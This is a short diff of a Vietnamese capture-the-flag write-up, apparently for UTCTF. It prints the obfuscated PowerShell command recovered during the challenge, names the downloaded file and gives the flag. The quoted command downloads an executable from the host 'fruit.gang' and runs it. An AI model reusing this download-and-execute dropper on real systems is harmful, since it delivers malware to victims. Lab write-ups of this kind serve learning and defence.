@@ -14,4 +14,10 @@ Thực hiện xem nội dung đoạn powershell được thực thi thu được
 
 ![image](https://github.com/Eafz/demo/assets/55439965/35035ba2-13d7-4a26-b8a1-d088d3a27273)
 
-`poWeRsHELL -command "$oaK = new-object Net.WebClient;$OrA = 'http://fruit.gang/malware';$CNTA = 'banANA-Hakrz09182afd4';$jri=$env:public+'\'+$CNTA+'.exe';try{$oaK.DownloadFile($OrA, $jri);Invoke-Item $jri;break;} catch {}"`
+```poWeRsHELL -command "$oaK = new-object Net.WebClient;$OrA = 'http://fruit.gang/malware';$CNTA = 'banANA-Hakrz09182afd4';$jri=$env:public+'\'+$CNTA+'.exe';try{$oaK.DownloadFile($OrA, $jri);Invoke-Item $jri;break;} catch {}"```
+
+File được tải xuống `banANA-Hakrz09182afd4.exe` 
+
+![image](https://github.com/Eafz/demo/assets/55439965/b091f70f-77cf-4b6e-82ef-7f930959cf2b)
+
+`Flag:UTCTF{banANA-Hakrz09182afd4.exe}` 
